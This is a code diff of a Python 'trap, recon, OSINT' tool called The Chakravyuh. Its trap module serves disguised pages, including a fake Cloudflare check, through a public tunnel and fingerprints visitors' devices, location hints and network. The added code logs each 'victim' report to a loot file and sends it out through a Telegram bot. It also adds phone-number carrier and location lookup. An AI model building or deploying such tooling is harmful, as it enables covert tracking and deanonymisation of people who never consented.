@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
-# Author: Lokesh Kumar
-# Date: 2026-02-08
-# Youtube: https://youtube.com/@termux2
-# Github:  https://github.com/trmxvibs
+# Author: Lokesh Kumar 
+# Version: 
+
 import sys
 import os
 import time
@@ -18,15 +17,17 @@ import urllib.error
 import re
 from datetime import datetime
 
-
+# --- 1. AUTO-INSTALLER ---
 class InstallManager:
     @staticmethod
     def check():
-        required = ['requests', 'shodan', 'folium', 'user_agents']
+        required = ['requests', 'shodan', 'folium', 'user_agents', 'phonenumbers']
         missing = []
         for req in required:
-            try: __import__(req)
-            except ImportError: missing.append(req)
+            try: 
+                __import__(req)
+            except ImportError: 
+                missing.append(req)
         
         if missing:
             print(f"[*] Installing dependencies: {', '.join(missing)}...")
@@ -39,23 +40,17 @@ try:
     import shodan
     import folium
     import user_agents
+    import phonenumbers
+    from phonenumbers import geocoder, carrier
+    import requests
 except: pass
 
-
-if os.name == 'nt':
-    os.system('color') # Windows
+if os.name == 'nt': os.system('color')
 
 class Colors:
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    RED = '\033[91m'
-    YELLOW = '\033[93m'
-    WHITE = '\033[97m'
-    MAGENTA = '\033[95m'
-    GREY = '\033[90m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-
+    CYAN = '\033[96m'; GREEN = '\033[92m'; RED = '\033[91m'
+    YELLOW = '\033[93m'; WHITE = '\033[97m'; MAGENTA = '\033[95m'
+    GREY = '\033[90m'; RESET = '\033[0m'; BOLD = '\033[1m'
 
 class Utils:
     @staticmethod
@@ -68,35 +63,52 @@ class Utils:
             return s.getsockname()[1]
 
     @staticmethod
+    def save_loot(data):
+        with open("loot_log.txt", "a", encoding="utf-8") as f:
+            f.write(f"[{datetime.now()}] {data}\n{'-'*50}\n")
+
+    @staticmethod
+    def send_telegram(msg):
+        cfg = ConfigManager.load()
+        if "tg_token" in cfg and "tg_id" in cfg:
+            try:
+                url = f"https://api.telegram.org/bot{cfg['tg_token']}/sendMessage"
+                requests.post(url, data={'chat_id': cfg['tg_id'], 'text': msg})
+            except: pass
+
+    @staticmethod
     def banner():
         Utils.clear()
         print(f"{Colors.RED}{Colors.BOLD}")
         print("       🌀THE CHAKRAVYUH 🌀       ")
         print(" ──────────────────────────────────────────")
         print("  █▀▄▀█ ▄▀█ █▄█ ▄▀█      ░░░ ░░░ ░░░")
-        print("  █ ▀ █ █▀█  █  █▀█ v1.0      ")
+        print("  █ ▀ █ █▀█  █  █▀█ v1.0   ")
         print(f"{Colors.MAGENTA} ═══════════════════════════════════════════{Colors.BOLD}")
         print(f"{Colors.YELLOW} LOKESH-KUMAR | traps | recon | osint{Colors.RESET}\n")
-        print("Youtube : https://youtube.com/@termux2")
-        print("Github :  https://github.com/trmxvibs ")
 
 class ConfigManager:
     FILE = "chakravyuh_config.json"
+    
     @staticmethod
     def load():
         if os.path.exists(ConfigManager.FILE):
-            try:
-                with open(ConfigManager.FILE, "r") as f: return json.load(f)
-            except: return {}
+            try: 
+                with open(ConfigManager.FILE, "r") as f: 
+                    return json.load(f)
+            except: 
+                return {}
         return {}
+
     @staticmethod
     def save(key, val):
         d = ConfigManager.load()
         d[key] = val
-        with open(ConfigManager.FILE, "w") as f: json.dump(d, f)
+        with open(ConfigManager.FILE, "w") as f: 
+            json.dump(d, f)
         print(f"{Colors.GREEN}[+] Config Saved.{Colors.RESET}")
 
-#  TEMPLATES 
+# HTML TEMPLATES
 TEMPLATES = {
     '1': ('Standard Loading', """<h1 style="color:white;font-family:sans-serif;text-align:center;margin-top:20%">Loading content...</h1>"""),
     '2': ('Fake Cloudflare', """
@@ -163,7 +175,6 @@ class ReconModule:
                 h = api.host(t)
                 print(f" OS     : {h.get('os')}")
                 print(f" Ports  : {h.get('ports')}")
-                print(f" Vulns  : {len(h.get('vulns', []))} detected")
             except: pass
         input("\nEnter to return...")
 
@@ -180,9 +191,17 @@ class ReconModule:
 
     def run_phone(self):
         p = input(f"{Colors.YELLOW}[?] Phone Number (+91..): {Colors.RESET}").strip()
-        print(f"{Colors.GREEN}[*] Basic Format Check...{Colors.RESET}")
-        if len(p) > 10: print(f" Valid Format: Yes\n Country Code: {p[:3]}")
-        print(f"{Colors.GREY}(Add Numverify API in code for full lookup){Colors.RESET}")
+        try:
+            parsed = phonenumbers.parse(p)
+            if phonenumbers.is_valid_number(parsed):
+                print(f"\n{Colors.GREEN}[+] Valid Number!{Colors.RESET}")
+                print(f" Location : {geocoder.description_for_number(parsed, 'en')}")
+                print(f" Carrier  : {carrier.name_for_number(parsed, 'en')}")
+                print(f" Timezone : {phonenumbers.timezone.time_zones_for_number(parsed)}")
+            else:
+                print(f"{Colors.RED}[!] Invalid Number format.{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
         input("\nEnter to return...")
 
     def run_domain(self):
@@ -198,7 +217,6 @@ class ReconModule:
         except: print("Domain not found.")
         input("\nEnter to return...")
 
-# --- TRAP ENGINE ---
 class TrapServer(http.server.SimpleHTTPRequestHandler):
     template_code = TEMPLATES['1'][1]
 
@@ -211,34 +229,49 @@ class TrapServer(http.server.SimpleHTTPRequestHandler):
         self.wfile.write(html.encode())
 
     def do_POST(self):
-        l = int(self.headers['Content-Length'])
-        d = json.loads(self.rfile.read(l).decode())
-        
-        ua = user_agents.parse(self.headers.get('User-Agent'))
-        
-        # GPU Prediction
-        gpu = d.get('g', '').lower()
-        pred = "Unknown"
-        if "mali" in gpu: pred = "Samsung/Realme (Mid-range)"
-        elif "adreno" in gpu: pred = "Redmi/OnePlus/Poco (Snapdragon)"
-        elif "apple" in gpu: pred = "iPhone/iPad"
-        elif "intel" in gpu or "nvidia" in gpu: pred = "PC/Laptop"
+        try:
+            l = int(self.headers['Content-Length'])
+            d = json.loads(self.rfile.read(l).decode())
+            ua = user_agents.parse(self.headers.get('User-Agent'))
+            
+            # Prediction Logic
+            gpu = d.get('g', '').lower()
+            pred = "Unknown"
+            if "mali" in gpu: pred = "Samsung/Realme (Mid)"
+            elif "adreno" in gpu: pred = "Redmi/OnePlus/Poco (Snapdragon)"
+            elif "apple" in gpu: pred = "iPhone/iPad"
 
-        print(f"\n{Colors.RED}[+] VICTIM CAPTURED: {self.client_address[0]} @ {datetime.now().strftime('%H:%M:%S')}{Colors.RESET}")
-        print(f"{Colors.CYAN}--- IDENTITY ---{Colors.RESET}")
-        print(f" OS      : {Colors.GREEN}{ua.os.family} {ua.os.version_string}{Colors.RESET}")
-        print(f" Browser : {ua.browser.family} {ua.browser.version_string}")
-        print(f" Loc     : {d.get('tz')}")
-        
-        print(f"{Colors.CYAN}--- HARDWARE ---{Colors.RESET}")
-        print(f" Model   : {Colors.MAGENTA}{pred}{Colors.RESET}")
-        print(f" GPU     : {d.get('g')}")
-        print(f" CPU     : {d.get('c')} Cores | RAM: {d.get('m')} GB")
-        print(f" Screen  : {d.get('w')}x{d.get('h')}")
-        print(f" Battery : {d.get('b')} (Charging: {d.get('bc')})")
-        print(f" Net     : {d.get('net')}\n")
-        
-        self.send_response(200); self.end_headers()
+            # Create Report
+            report = f"""
+[+] VICTIM CAPTURED: {self.client_address[0]}
+Time: {datetime.now().strftime('%H:%M:%S')}
+------------------------------------------------
+IDENTITY:
+ OS      : {ua.os.family} {ua.os.version_string}
+ Browser : {ua.browser.family}
+ Loc     : {d.get('tz')}
+
+HARDWARE:
+ Model   : {pred}
+ GPU     : {d.get('g')}
+ CPU     : {d.get('c')} Cores | RAM: {d.get('m')} GB
+ Screen  : {d.get('w')}x{d.get('h')}
+ Battery : {d.get('b')} (Charging: {d.get('bc')})
+ Net     : {d.get('net')}
+------------------------------------------------
+"""
+            # 1. Print to Screen
+            print(f"\n{Colors.RED}{report}{Colors.RESET}")
+            
+            # 2. Save to File
+            Utils.save_loot(report)
+
+            # 3. Send to Telegram
+            Utils.send_telegram(report)
+
+            self.send_response(200); self.end_headers()
+        except Exception as e:
+            print(f"Error processing data: {e}")
 
 class TrapManager:
     def run(self):
@@ -257,17 +290,22 @@ class TrapManager:
         print(f"{Colors.GREEN}[+] Local: http://localhost:{port}{Colors.RESET}")
         print(f"{Colors.YELLOW}[*] Starting Tunnel...{Colors.RESET}")
         
+        # Fixed Regex for Cloudflared
         if shutil.which("cloudflared"):
             proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"], 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             while True:
                 line = proc.stderr.readline().decode()
+                # Added 'r' to fix SyntaxWarning
                 if "trycloudflare.com" in line:
                     match = re.search(r"(?P<url>https?://[^\s]+trycloudflare\.com)", line)
-                    if match: print(f"\n{Colors.GREEN}{Colors.BOLD} >>> LINK: {match.group('url')} <<<{Colors.RESET}\n"); break
+                    if match: 
+                        print(f"\n{Colors.GREEN}{Colors.BOLD} >>> LINK: {match.group('url')} <<<{Colors.RESET}\n")
+                        break
         else:
+            # Fallback to Serveo
             subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net".split())
-            print(f"{Colors.GREY}(Check logs for Serveo link){Colors.RESET}")
+            print(f"{Colors.GREY}(Serveo started. Check output for link){Colors.RESET}")
 
         print("Waiting for victims... (Ctrl+C to stop)")
         try:
@@ -282,7 +320,7 @@ def main():
         Utils.banner()
         print(f"{Colors.CYAN}[1] IP Tracker {Colors.RESET}")
         print(f"{Colors.CYAN}[2] Port Scanner {Colors.RESET}")
-        print(f"{Colors.CYAN}[3] Phone Number Tracker{Colors.RESET}")
+        print(f"{Colors.CYAN}[3] Phone Number Tracker {Colors.GREEN}{Colors.RESET}")
         print(f"{Colors.CYAN}[4] Domain Intel (DNS){Colors.RESET}")
         print(f"{Colors.CYAN}[5] Device Traper {Colors.RESET}")
         print(f"{Colors.CYAN}[6] Settings {Colors.RESET}")
@@ -296,7 +334,11 @@ def main():
         elif c == '4': rm.run_domain()
         elif c == '5': tm.run()
         elif c == '6': 
-            k = input("Shodan API Key: "); ConfigManager.save("shodan_api", k)
+            print("\n1. Shodan API\n2. Telegram Token\n3. Telegram Chat ID")
+            opt = input("> ")
+            if opt == '1': ConfigManager.save("shodan_api", input("Key: "))
+            if opt == '2': ConfigManager.save("tg_token", input("Token: "))
+            if opt == '3': ConfigManager.save("tg_id", input("ID: "))
         elif c == '0': sys.exit()
 
 if __name__ == "__main__":
